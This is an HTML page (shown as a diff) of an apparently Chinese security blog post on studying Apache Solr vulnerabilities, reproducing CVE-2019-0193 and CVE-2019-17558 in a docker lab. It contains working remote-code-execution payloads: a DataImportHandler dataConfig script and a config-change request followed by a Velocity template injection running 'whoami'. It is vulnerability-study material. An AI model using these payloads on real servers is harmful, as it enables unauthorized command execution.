@@ -1,0 +1,543 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="BigCircle">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="solr 漏洞学习关于solrApache Solr是一个流行的开源搜索服务器，它通过使用类似REST的HTTP API，这就确保你能从几乎任何编程语言来使用solr。solr本身也可以看成数据库,(no sql类型),但它比数据库搜索速度更快,所以在项目中我们一般把搜搜的部分交给solr,就像我们在京东首页所看到的商品信息,并不是来自数据库,而是来源于sorl的索引库数据库本身不能实现分词效果,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="solr 漏洞学习">
+<meta property="og:url" content="http://example.com/cllaoz37f000hrcutf6s6f3yd/index.html">
+<meta property="og:site_name" content="BigCircle-sec&#39;s Blog">
+<meta property="og:description" content="solr 漏洞学习关于solrApache Solr是一个流行的开源搜索服务器，它通过使用类似REST的HTTP API，这就确保你能从几乎任何编程语言来使用solr。solr本身也可以看成数据库,(no sql类型),但它比数据库搜索速度更快,所以在项目中我们一般把搜搜的部分交给solr,就像我们在京东首页所看到的商品信息,并不是来自数据库,而是来源于sorl的索引库数据库本身不能实现分词效果,">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/solr-0.png">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/solr-1.png">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/solr-2.png">
+<meta property="og:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/solr-3.png">
+<meta property="article:published_time" content="2023-08-13T16:08:33.707Z">
+<meta property="article:modified_time" content="2023-08-14T04:45:28.677Z">
+<meta property="article:author" content="BigCircle">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/solr-0.png">
+  
+  
+  
+  <title>solr 漏洞学习 - BigCircle-sec&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>BigCircle-sec&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="solr 漏洞学习"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.8k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          23 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">solr 漏洞学习</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="solr-漏洞学习"><a href="#solr-漏洞学习" class="headerlink" title="solr 漏洞学习"></a>solr 漏洞学习</h1><h2 id="关于solr"><a href="#关于solr" class="headerlink" title="关于solr"></a>关于solr</h2><p>Apache Solr是一个流行的开源搜索服务器，它通过使用类似REST的HTTP API，这就确保你能从几乎任何编程语言来使用solr。<br>solr本身也可以看成数据库,(no sql类型),但它比数据库搜索速度更快,所以在项目中我们一般把搜搜的部分交给solr,就像我们在京东首页所看到的商品信息,并不是来自数据库,而是来源于sorl的索引库<br>数据库本身不能实现分词效果,而只能使用模糊查询,但是模糊查询非常低效,查询速度比较慢,由于在实际生活中,一般搜索是用的比较多的,这样数据库压力自然就很大,所以我们就让供专业的solr来做搜索功能</p>
+<h2 id="CVE-2019-0193"><a href="#CVE-2019-0193" class="headerlink" title="CVE-2019-0193"></a>CVE-2019-0193</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>此次漏洞出现在Apache Solr的DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的DIH配置都可以通过外部请求的dataConfig参数来设置。由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。即控制dataConfig字段实现xxe注入，实现命令执行</p>
+<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Apache solr &lt; 8.2.0<br>启动docker镜像，访问your-ip:8983<br>其中 ，访问your-ip:8983&#x2F;solr&#x2F;admin&#x2F;cores可以查看已创建的核心<br>复现时，首先在docker镜像中创建一个solr核心，命令为:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db<br></code></pre></td></tr></table></figure>
+<p>其中test为core名称。创建好后，进入solr的admin界面 your-ip:8983&#x2F;solr&#x2F;,选择刚刚创建的core<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/solr-0.png" srcset="/img/loading.gif" lazyload><br>选择dataimport模块<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/solr-1.png" srcset="/img/loading.gif" lazyload><br>开启debug模式<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/solr-2.png" srcset="/img/loading.gif" lazyload><br>点击Execute with this Configuration,使用burp抓包，将数据包中的dataConfig模块更改为下面的payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dataConfig</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;URLDataSource&quot;</span>/&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">&lt;![CDATA[ function poc()&#123; java.lang.Runtime.getRuntime().exec(&quot;touch /tmp/success&quot;); &#125; ]]&gt;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">document</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">entity</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;stackoverflow&quot;</span> <span class="hljs-attr">url</span>=<span class="hljs-string">&quot;https://stackoverflow.com/feeds/tag/solr&quot;</span> <span class="hljs-attr">processor</span>=<span class="hljs-string">&quot;XPathEntityProcessor&quot;</span> <span class="hljs-attr">forEach</span>=<span class="hljs-string">&quot;/feed&quot;</span> <span class="hljs-attr">transformer</span>=<span class="hljs-string">&quot;script:poc&quot;</span> /&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">document</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">dataConfig</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>要注意的是，数据包中原有的dataConfig字段的值是经过url编码的，所以上面的payload也要经过url编码后才可以发送<br>发送数据包后，进入容器界面，文件创建成功<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/solr-3.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="CVE-2019-17558"><a href="#CVE-2019-17558" class="headerlink" title="CVE-2019-17558"></a>CVE-2019-17558</h2><h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>攻击者通过未授权访问solr服务器，发送特定的数据包开启 params.resource.loader.enabled，然后get访问接口导致服务器命令执行。</p>
+<h3 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h3><p>5.0.0 到 8.3.1版本</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>启动docker镜像，访问your-ip:8983&#x2F;solr&#x2F;admin&#x2F;cores即可获取所有cores的信息，可以发现有demo核心<br>访问your-ip:8983&#x2F;solr&#x2F;demo&#x2F;config发现 params.resource.loader.enabled为false（默认均为false），而此漏洞的里利用需要params.resource.loader.enabled为true，可以通过向&#x2F;solr&#x2F;demo&#x2F;config发送post数据包更改该属性值，数据包如下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/solr/demo/config</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>solr:8983<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>259<br><br><span class="language-n1ql"></span><br><span class="language-n1ql">&#123;</span><br><span class="language-n1ql">  &quot;<span class="hljs-keyword">update</span>-queryresponsewriter<span class="hljs-string">&quot;: &#123;</span></span><br><span class="hljs-string"><span class="language-n1ql">    &quot;</span>startup<span class="hljs-string">&quot;: &quot;</span>lazy<span class="hljs-string">&quot;,</span></span><br><span class="hljs-string"><span class="language-n1ql">    &quot;</span>name<span class="hljs-string">&quot;: &quot;</span>velocity<span class="hljs-string">&quot;,</span></span><br><span class="hljs-string"><span class="language-n1ql">    &quot;</span>class<span class="hljs-string">&quot;: &quot;</span>solr.VelocityResponseWriter<span class="hljs-string">&quot;,</span></span><br><span class="hljs-string"><span class="language-n1ql">    &quot;</span>template.base.dir<span class="hljs-string">&quot;: &quot;</span><span class="hljs-string">&quot;,</span></span><br><span class="hljs-string"><span class="language-n1ql">    &quot;</span>solr.resource.loader.enabled<span class="hljs-string">&quot;: &quot;</span><span class="hljs-literal">true</span><span class="hljs-string">&quot;,</span></span><br><span class="hljs-string"><span class="language-n1ql">    &quot;</span>params.resource.loader.enabled<span class="hljs-string">&quot;: &quot;</span><span class="hljs-literal">true</span><span class="hljs-string">&quot;</span></span><br><span class="hljs-string"><span class="language-n1ql">  &#125;</span></span><br><span class="hljs-string"><span class="language-n1ql">&#125;</span></span><br></code></pre></td></tr></table></figure>
+<p>此时已经满足该漏洞的利用条件，payload为：</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">/solr/demo/select?q=<span class="hljs-number">1</span>&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=<span class="hljs-meta">%23set</span>(<span class="hljs-variable">$x</span>=<span class="hljs-meta">%27</span><span class="hljs-meta">%27</span>)+<span class="hljs-meta">%23set</span>(<span class="hljs-variable">$rt</span>=<span class="hljs-variable">$x</span>.class.forName(<span class="hljs-meta">%27java</span><span class="hljs-built_in">.lang</span>.Runtime<span class="hljs-meta">%27</span>))+<span class="hljs-meta">%23set</span>(<span class="hljs-variable">$chr</span>=<span class="hljs-variable">$x</span>.class.forName(<span class="hljs-meta">%27java</span><span class="hljs-built_in">.lang</span>.Character<span class="hljs-meta">%27</span>))+<span class="hljs-meta">%23set</span>(<span class="hljs-variable">$str</span>=<span class="hljs-variable">$x</span>.class.forName(<span class="hljs-meta">%27java</span><span class="hljs-built_in">.lang</span>.String<span class="hljs-meta">%27</span>))+<span class="hljs-meta">%23set</span>(<span class="hljs-variable">$ex</span>=<span class="hljs-variable">$rt</span>.getRuntime().exec(<span class="hljs-meta">%27whoami</span><span class="hljs-meta">%27</span>))+<span class="hljs-variable">$ex</span>.waitFor()+<span class="hljs-meta">%23set</span>(<span class="hljs-variable">$out</span>=<span class="hljs-variable">$ex</span>.getInputStream())+<span class="hljs-meta">%23foreach</span>(<span class="hljs-variable">$i</span>+<span class="hljs-keyword">in</span>+[<span class="hljs-number">1</span>..<span class="hljs-variable">$out</span>.available()])<span class="hljs-variable">$str</span>.valueOf(<span class="hljs-variable">$chr</span>.toChars(<span class="hljs-variable">$out</span>.read()))<span class="hljs-meta">%23end</span><br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/cllaoz37c000crcut6jkkc8pt/" title="jboss 漏洞学习">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">jboss 漏洞学习</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/cllaoz37b000brcut21185rzq/" title="influxdb 漏洞学习">
+                        <span class="hidden-mobile">influxdb 漏洞学习</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
